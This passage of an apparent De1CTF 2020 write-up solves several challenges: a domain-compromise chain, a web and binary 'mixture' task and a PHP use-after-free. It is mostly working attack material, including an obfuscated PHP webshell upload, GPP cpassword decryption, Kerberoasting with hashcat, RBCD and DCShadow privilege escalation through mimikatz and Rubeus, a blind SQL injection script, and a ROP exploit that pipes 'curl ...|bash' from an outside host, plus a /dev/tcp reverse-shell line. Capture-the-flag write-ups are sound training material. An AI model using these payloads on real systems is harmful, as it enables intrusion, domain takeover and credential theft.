class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$_=$$____?&gt;</span><br><span class="line">&lt;?=$___($_[_])?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD--</span><br></pre></td></tr></table></figure>
<p>After getting the webshell, it is found that the flag is not on the web server. It is guessed that it should be internal penetration. For convenience, you can reverse a meterpreter or beacon back. Then the next step is internal penetration. Collect simple information and find that the domain controllor shared folder Hint has a compressed package <code>flag1_and_flag2hint.zip</code></p>
<figure>
<img src="https://i.loli.net/2020/05/05/VCn4FW2amxzYbpw.png" alt><figcaption>1.png</figcaption>
</figure>
<p>Download it, find that the compressed package requires a password, continue to collect information, and find a user <code>HintZip_Pass</code>, guessing that the compressed password should start from this user.</p>
<p><img src="https://i.loli.net/2020/05/05/vPFWmMsaQSrzNVn.png" alt="2.png"> Then collect some information of the <code>Zip_Password</code> user and find that this user belongs to the OU of<code>Zip_Password</code>, not the regular Users container</p>
<figure>
<img src="https://i.loli.net/2020/05/05/C7cJ9afkQuGbM1m.png" alt><figcaption>3.png</figcaption>
</figure>
<p>Found that this OU has a <code>gplink</code></p>
<figure>
<img src="https://i.loli.net/2020/05/05/F2w5M9LPtsrzfnu.png" alt><figcaption>4.png</figcaption>
</figure>
<p>Then collect information on this GPO</p>
<figure>
<img src="https://i.loli.net/2020/05/05/bPR6IZ7mpBNk14Q.png" alt><figcaption>6.png</figcaption>
</figure>
<p>Then use <code>Get-GPPPassword.ps1</code> to get the compressed package password</p>
<figure>
<img src="https://i.loli.net/2020/05/05/KUwZt3nkrH8SgpR.png" alt><figcaption>5.png</figcaption>
</figure>
<p>or write a script to decrypt <code>cpassword</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">key = <span class="string">"4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">cpassword = <span class="string">"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"</span></span><br><span class="line">cpassword += <span class="string">"="</span> * ((<span class="number">4</span> - len(cpassword) % <span class="number">4</span>) % <span class="number">4</span>)</span><br><span class="line">password = b64decode(cpassword)</span><br><span class="line">plain = AES.new(key, AES.MODE_CBC, <span class="string">"\x00"</span> * <span class="number">16</span>)</span><br><span class="line">plain = plain.decrypt(password)</span><br><span class="line"><span class="keyword">print</span> plain[:-ord(plain[<span class="number">-1</span>])].decode(<span class="string">'utf16'</span>)</span><br></pre></td></tr></table></figure>
<p>After decompression, you can get flag1 and some hints of flag2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag1: De1CTF&#123;GpP_11Is_SoOOO_Ea3333y&#125;</span><br><span class="line"></span><br><span class="line">Get flag2 Hint:</span><br><span class="line">hint1: You need De1ta user to get flag2</span><br><span class="line">hint2: De1ta user&apos;s password length is 1-8, and the password is composed of [0-9a-f].</span><br><span class="line">hint3: Pay attention to the extended rights of De1ta user on the domain.</span><br><span class="line">hint4: flag2 in Domain Controller (C:\Users\Administrator\Desktop\flag.txt)</span><br><span class="line"></span><br><span class="line">PS: Please do not damage the environment after getting permission, thanks QAQ.</span><br></pre></td></tr></table></figure>
<p>According to Hint, you need user De1ta to get flag2, and then collect information for De1ta users, and find that web users have write permission for De1ta user's servicePrincipalName attribute.</p>
<figure>
<img src="https://i.loli.net/2020/05/05/K8YJMgxf6SmNCbn.png" alt><figcaption>8.png</figcaption>
</figure>
<p>According to Hint2, the guess should be to set up a spn for De1ta through a web user and then use Kerberoasting to brute force the password of the De1ta user.</p>
<p>set up spn for De1ta users</p>
<figure>
<img src="https://i.loli.net/2020/05/05/bRzpTnIfJKluUkD.png" alt><figcaption>9.png</figcaption>
</figure>
<p>then <code>Kerberoasting</code></p>
<figure>
<img src="https://i.loli.net/2020/05/05/zs1ewu7xq256Fbd.png" alt><figcaption>10.png</figcaption>
</figure>
<p>Then use hashcat offline brute force according to Hint2 to get the password of De1ta user</p>
<p>PS：You can also use the LDAP protocol to brute force online, but the password length is <code>16^1 + 16^2 + 16^3 + 16^4 + 16^5 + 16^6 + 16^7 + 16^8 = 4581298448</code>, It is clear that online brute force cracking is unrealistic.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13100 $krb5tgs$23$*USER$DOMAIN$test/test*$64EC0B10760E27F6EF4811DA3478C56D$77696AF42F593CF24D6B62D3DFEEF4AF8451E912AEC808B81BB2A833059EF7B0E9B41695D572B73917814E2439581239D264F4EF8ED6FC4DBC8DF5EA7D1F5CAD0B3197BFC16798C8EF2546B6DE4504D0F1C007EEA3222E948A448D818BDC8E4C26BBE2FD5D321BB0E2B0C6985383D9BA2E83E6389B4043E6CD04F2715C3159B7374DB32B817B4B3B04537CFDACD6FF54911F076EED74F820AF85D17FF93081775828E70DCD4489819EB6C6D518CF0C10F498B9A96EAA9CA330E8CE81C02D795572991D8979E39A6C633E849FCBC2831943F067320E41BF4FB0A9B8EB2EEC4CDD91606BDA4DF32A8BB4869D2CD424D9A156943D20E91F08C6EFA65B7C7AFC41309BCDA965E95D81318E47044D9333012914BBF27B1A48FC55BF8494DD65F317CAFA22F42F290335161ACE544841C196EBC239EE99A7F31C215119421390FAD8F16AAC63A7F83066B4CC5FB6AB89C61691E9202B447A4E920AF42A641133753AD5CF51580FBBAE080EBBAF589A1DF1E9543288A18116A0E191261149E63B88874BA607B3E4517EF84F3BA9B18255B58B3FF2C8570DCABC12F4FC0DA49AE61A92E8AF3C0ECD746BFF591743EFBC438E15CC645ECA3BFD935649168367287DD4E8029FC4454FAE237E8048FA701F8901EC9B4B5372E6B85802AB8A26F233D583F79F49CBAC378838E3C05AB2C2065C35A6C5D8B0B92D7F438E80BF3A1D847DC174BB0D370EB09125D710243001A9D988E350B43D556AEE8F09053790AAAFC395292EE2FAD3B7A04EB330AB90D2EAE29D9D922F0BB65ED2FF05A9A73B09001F5AECE1BC7162DE480F5463C7B19932B50DFA0329CDF0F964EFC0647FB7319408B541587D6AF2730EC52243E7A7BAB096AFB1FA6E7A81A7148347B43394BC3E280062105C1A6859F278C829E3BBAC3FD4F545154657BC4E0F55AF439140B3B1D29EE4209B8F83E3E3DDC52A6C32E92EB2836F80AF972B54D029D8EC071BD12BDCA45DBDF555A64B16AEC90CC486159D07D53A9D9196E5A736F48350F5639F482B45E7BA3EC11A9B7CA4DD8BC6320058CA0D891F5B4B1BFE0243E8D9640380492B0BEFB9EC13B8A4B2DE4297C3DE84FDB2753693F5E9FFB46FC1F60748AF1A07DE60F7656DBEDB927E3DF35B1AE8588BA6450C8D7539F982385D1B8AC25B37638EF9414519F37773A353EBBAAF996DF17DDE3CBF64B9ACFBEF65E12773004BDF5B6B81CC8CF5D2B59C6A2AAA883B458676AD2800710FA3F017C2E53B353D4E2C6B0D92D57B79939D29FAA8049F6CF0782E2572ACE8E8FFDFE1A05AC277924D4826606F5C68369C15186910DAEC601CA691910DCE519D58EDC964D5844FE8B7B21F9F99C6891FAE7DC0D783EA78EF6393A92F273D98353718670BA167A9CC9809B03195EDA8323B7C887040CD37FF4A09 -1 0123456789abcdef --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://i.loli.net/2020/05/05/1FcBuURiYK9NwVH.png" alt><figcaption>11.png</figcaption>
</figure>
<p>According to Hint3: Pay attention to the extended rights of De1ta user on the domain.Then collect information on the domain ACL</p>
<figure>
<img src="https://i.loli.net/2020/05/05/GFscQ52ryqzDbVH.png" alt><figcaption>12.png</figcaption>
</figure>
<p>It is found that De1ta users have the permissions of <code>Add/Remove Replica In Domain</code>,<code>Replication Synchronization</code>, and <code>Manage Replication Topology</code> on the domain. This is easy to think of Dcshadow, but the three permissions alone do not meet the conditions of Dcshadow. Then collect the related ACLS</p>
<p>Found that De1ta users have <code>Create Child</code> and<code>Delete Chind</code> permissions on <code>CN = Sites, CN = Configuration, DC = De1CTF2020, DC = lab</code> containers</p>
<figure>
<img src="https://i.loli.net/2020/05/05/dcwhRPqpyLxbTrQ.png" alt><figcaption>13.png</figcaption>
</figure>
<p>De1ta has write permission for DM attributes, which just meets all the permissions of Dcshadow.</p>
<figure>
<img src="https://i.loli.net/2020/05/05/9QMeEHbmWZOT4CL.png" alt><figcaption>14.png</figcaption>
</figure>
<p>But there is still a problem now that Dcshadow needs system permission to call the local RPC service. As mentioned above, De1ta has write permission to the DM attribute. Through information collection, you can know that the domain controller is <code>Windows Server 2012R2</code></p>
<figure>
<img src="https://i.loli.net/2020/05/05/tuUW5Tsv8akISbY.png" alt><figcaption>38.png</figcaption>
</figure>
<p>Therefore, we get high-privilege through resource-based constrained delegation.</p>
<p>Request a TGT of de1ta user and import the current session.</p>
<figure>
<img src="https://i.loli.net/2020/05/05/3b6wdSU97xmQ8DK.png" alt><figcaption>27.png</figcaption>
</figure>
<p>Then create a new computer user, evilsystem, and configure the resource-based constraint delegation from evilsystem to DM</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount evilsystem -Password $(<span class="built_in">ConvertTo-SecureString</span> <span class="string">"evil"</span> -AsPlainText -Force)</span><br><span class="line"></span><br><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1806179181-549835139-1294087714-1111)"</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line">Get-DomainComputer DM| Set-DomainObject -Set @&#123;<span class="string">'msds-allowedtoactonbehalfofotheridentity'</span>=<span class="variable">$SDBytes</span>&#125; -Verbose</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://i.loli.net/2020/05/05/b7iMdkjF6ElXpKe.png" alt><figcaption>img</figcaption>
</figure>
<p>After the configuration is complete, we can get a high privileged shell through s4u.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getst.exe -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/evilsystem:evil</span><br><span class="line">set KRB5CCNAME=&quot;Administrator.ccache&quot;</span><br><span class="line">wmiexec.exe -no-pass -k dm shell.exe</span><br></pre></td></tr></table></figure>
<p>After execution, you can get a high-privileged shell</p>
<figure>
<img src="https://i.loli.net/2020/05/05/tTIwNgMYdS2WCZK.png" alt><figcaption>img</figcaption>
</figure>
<p>Then use Dcshadow to modify the user's attributes. Here, you can change the SID-History to the domain admin SID or modify the PrimaryGroupID to the domain admins group's primaryGroupID (512).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe  &quot;!+&quot; &quot;!processtoken&quot; &quot;lsadump::dcshadow /object:de1ta /attribute:primaryGroupID /value:512&quot;</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://i.loli.net/2020/05/05/lvid7czZSfP3apE.png" alt><figcaption>32.png</figcaption>
</figure>
<p>Then use user De1ta to push, triggering data synchronization between domain controllers</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:de1ta /rc4:B03094996601324646AC223BF30D0D07 /domain:de1ctf2020.lab /ptt &amp;&amp; mimikatz.exe &quot;lsadump::dcshadow /push&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://i.loli.net/2020/05/05/IbnqfEOQMpAH2ho.png" alt><figcaption>36.png</figcaption>
</figure>
<p>After pushing, check whether De1ta joins the domain admins group</p>
<figure>
<img src="https://i.loli.net/2020/05/05/YNK7qHQydiMglxB.png" alt><figcaption>35.png</figcaption>
</figure>
<p>then read the flag on the domain controller</p>
<figure>
<img src="https://i.loli.net/2020/05/05/vaGIPQfXKyEJl7r.png" alt><figcaption>37.png</figcaption>
</figure>
<p>The whole process is as follows:</p>
<figure>
<img src="https://i.loli.net/2020/05/05/3LARC8ax2MBQJWY.gif" alt><figcaption>9.gif</figcaption>
</figure>
<h2><span id="mixture">mixture</span></h2>
<p>After logging in, I found that member.php has  &lt;!-orderby-&gt; prompt, guessing that there is orderby injection. After a simple attempt, I found that when orderby = | 2, the displayed page is different. The injection script is as follows</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://49.51.251.99/index.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"username"</span>:<span class="string">"xxxxx"</span>,</span><br><span class="line">    <span class="string">"password"</span>:<span class="string">"xxxxxxx"</span>,</span><br><span class="line">    <span class="string">"submit"</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line">cookie =&#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span>: <span class="string">"sou26piclav6f99h79k1l5vmbn"</span></span><br><span class="line">&#125;</span><br><span class="line">requests.post(url,data=data,cookies=cookie)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">url=<span class="string">"http://49.51.251.99/member.php?orderby="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz,'</span>:</span><br><span class="line">        payload=<span class="string">"|(mid((select password from member),&#123;&#125;,1)='&#123;&#125;')%2b1"</span>.format(i,j)</span><br><span class="line">        true_url=url+payload</span><br><span class="line">        r=requests.get(true_url,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> r.content.index(<span class="string">'tom'</span>)&lt;r.content.index(<span class="string">'1000000'</span>):</span><br><span class="line">            <span class="keyword">print</span> payload+<span class="string">' ok'</span></span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> payload</span><br><span class="line">//<span class="number">18</span>a960a3a0b3554b314ebe77fe545c85</span><br></pre></td></tr></table></figure>
<p>And password is md5 encrypted，After decryption, the password is <code>goodlucktoyou</code></p>
<p>Minclude.so is a php extension written by the author.The function Minclude in search.php corresponds to zip_Minclude() in Minclude.so</p>
<p>Decompile the zip_Minclude you will find nothing here. Read the assembly you will find some easy junk instruction. Nop these codes and then you can decompile it.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">zif_Minclude</span><span class="params">(zend_execute_data *execute_data, zval *return_value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *fp; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  zend_value v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *parameter; <span class="comment">// [rsp+0h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">size_t</span> length; <span class="comment">// [rsp+8h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> path[<span class="number">96</span>]; <span class="comment">// [rsp+10h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+70h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [rsp+74h] [rbp-24h]</span></span><br><span class="line"></span><br><span class="line">  parameter = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">memset</span>(path, <span class="number">0</span>, <span class="keyword">sizeof</span>(path));</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = path;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)zend_parse_parameters(execute_data-&gt;This.u2.next, <span class="string">"s"</span>, &amp;parameter, &amp;length) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(path, parameter, length);</span><br><span class="line">    php_printf(<span class="string">"%s"</span>, path);</span><br><span class="line">    php_printf(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    fp = fopen(path, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fp )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( !feof(fp) )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = fgetc(fp);</span><br><span class="line">        php_printf(<span class="string">"%c"</span>, v3);</span><br><span class="line">      &#125;</span><br><span class="line">      php_printf(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      php_printf(<span class="string">"no file\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v4.lval = zend_strpprintf(<span class="number">0L</span>L, <span class="string">"True"</span>);</span><br><span class="line">    return_value-&gt;value = v4;</span><br><span class="line">    return_value-&gt;u1.type_info = (*(_BYTE *)(v4.lval + <span class="number">5</span>) &amp; <span class="number">2u</span>) &lt; <span class="number">1</span> ? <span class="number">5126</span> : <span class="number">6</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The function is very simple. <code>end_parse_parrmeters</code>will parse the parameters, the "s" specifies the type of the parameters is a string.</p>
<p>Then copy the parameter into a variable on the stack. The length may bigger than path buffer size which may lead to stack overflow, and you can call <code>system</code> to reverse a shell.</p>
<p>v9 under the <code>path</code> stores the address of the <code>path</code>, which is used to simplify the exploit. You can leak this address easily.</p>
<p>This function's purpose is to read any file and print on the website, so you can read /proc/self/maps and get the address of libc, and then you can ROP.</p>
<p>I don't know why <code>/bin/bash -i &gt;&amp; /dev/tcp/XXX.XXX.XXX.XXX/XXXX 0&gt;&amp;1</code> can't reverse a shell, you can do other way.</p>
<p>Notice that the address of the <code>path</code> is smaller than <code>rsp</code> when return, and next call <code>system</code> may cover it, so you should put your command behind.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://134.175.185.244/select.php"</span></span><br><span class="line">url = <span class="string">"http://49.51.251.99/select.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"username"</span>:<span class="string">"admin"</span>,</span><br><span class="line">    <span class="string">"password"</span>:<span class="string">"goodlucktoyou"</span>,</span><br><span class="line">    <span class="string">"submit"</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line">cookie =&#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span>: <span class="string">"p51gfmno1tv687igcc1ndq14vh"</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url,data=data,cookies=cookie)</span><br><span class="line">print(res.status_code)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'search'</span>:<span class="string">"a"</span>*<span class="number">100</span>,</span><br><span class="line">    <span class="string">'submit'</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url,data=data,cookies=cookie)</span><br><span class="line">print(res.content)</span><br><span class="line">res = res.content.split(<span class="string">b'a'</span>*<span class="number">100</span>)[<span class="number">1</span>]</span><br><span class="line">stack = res[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">b'\x00\x00'</span></span><br><span class="line">stack = struct.unpack(<span class="string">'&lt;Q'</span>, stack)[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">"[+] stack:"</span>, hex(stack))</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'search'</span>: <span class="string">"/proc/self/maps"</span>,</span><br><span class="line">    <span class="string">'submit'</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url,data=data,cookies=cookie).content.split(<span class="string">b"\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"libc-2.28.so"</span> <span class="keyword">in</span> i:</span><br><span class="line">        libc_base = int(<span class="string">b"0x"</span> + i[<span class="number">0</span>:<span class="number">12</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"[+] libc_base:"</span>, hex(libc_base))</span><br><span class="line"></span><br><span class="line">bss_str = libc_base + <span class="number">0x0000000001C0000</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023a5f</span></span><br><span class="line">read = libc_base + <span class="number">0x00000000000EA450</span></span><br><span class="line">system = libc_base + <span class="number">0x00000000000449C0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"a"</span>*<span class="number">136</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(stack+<span class="number">136</span>+<span class="number">24</span>) + p64(system) + <span class="string">b"curl https://shell.now.sh/xxx.xxx.xxx.xxx:xxxx|bash\x00"</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'search'</span>:payload,</span><br><span class="line">    <span class="string">'submit'</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    res = requests.post(url,data=data,cookies=cookie)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>After getting the shell, execute / readflag and calculate the value of the expression to get the flag</p>
<blockquote>
<p>De1CTF{47ae3396-f5ce-47ab-bb64-34b5154064c4}</p>
</blockquote>
<h2><span id="easy-php-uaf">Easy PHP UAF</span></h2>
<h3><span id="solution">solution</span></h3>
<p>This challenge is based on this exploit: https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php , which use a bug in debug_backtrace() function to cause a use-after-free vulnerability. With this vulnerability, we can leak and write PHP memory.</p>
<p>To solve this challenge, you need some knowledge about PHP source and a little about Pwn.</p>
<p>I do something to increase the difficulty of this challenge:</p>
<ol type="1">
<li>blocked loop functionality in lex_scan</li>
<li>limit recursion depth in extension</li>
<li>blocked strlen()</li>
</ol>
<p>If you use gdb to debug and find out how the original exploit works, you will find that solution is so easy:</p>
<ol type="1">
<li>UAF, you can use the original exploit</li>
<li>leak the head point of next php heap, which can be used to compute the address of $helper and $abc</li>
<li>leak the address of Closure Object</li>
<li>write $helper -&gt; a to make it a fake string which point to Closure Object</li>
<li>leak Closure Handlers from Closure Object and then compute the address of system</li>
<li>copy Closure Object to next php heap, change its address of internal_function.handler to system and write $helper -&gt; b to make it point to this fake Closure Object</li>
<li>execute $helper -&gt; b to execute system</li>
</ol>
<h3><span id="exp">exp</span></h3>
